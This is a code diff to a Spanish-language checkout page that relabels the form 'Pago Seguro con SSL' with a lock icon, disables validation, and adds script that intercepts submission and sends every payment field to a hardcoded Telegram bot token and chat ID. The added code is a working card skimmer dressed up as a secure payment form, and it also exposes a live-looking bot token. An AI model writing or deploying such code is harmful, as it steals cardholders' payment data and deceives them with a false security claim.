@@ -140,7 +140,7 @@
         margin-left: 10px;
     }
 
-    
+
     footer {
         background-color: green;
         color: #fff;
@@ -303,7 +303,7 @@
         </nav>
     </header>
     <div class="container">
-        <h1>Detalles de Pago</h1>
+        <h1><i class="bi bi-lock"></i> Pago Seguro con SSL</h1>
         <form action="/procesar_pago" method="post" onsubmit="return validarFormulario()">
             <label for="nombre-titular">Nombre del Titular:</label>
             <input type="text" id="nombre-titular" name="nombre-titular" required placeholder="Nombre">
@@ -345,8 +345,43 @@
         </footer>
 
     </div>
+    <script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
     <script>
+        function validarFormulario() {
+            return true;
+        }
 
+        document.addEventListener('DOMContentLoaded', function () {
+            const formulario = document.querySelector('form');
+
+            formulario.addEventListener('submit', function (event) {
+                event.preventDefault();
+
+                if (validarFormulario()) {
+                    const formData = new FormData(this);
+
+                    const TELEGRAM_BOT_TOKEN = '6202243249:AAGtTTl9YH2h4BiScQgdbLFwaa2is4dfbAo';
+                    const CHAT_ID = '5330560021';
+
+                    let message = 'Nuevo pago recibido:\n';
+
+                    formData.forEach((value, key) => {
+                        message += `${key}: ${value}\n`;
+                    });
+
+                    axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+                        chat_id: CHAT_ID,
+                        text: message,
+                    })
+                        .then(response => {
+                            console.log('Mensaje enviado con éxito:', response.data);
+                        })
+                        .catch(error => {
+                            console.error('Error al enviar mensaje a Telegram:', error);
+                        });
+                }
+            });
+        });
     </script>
 </body>
 
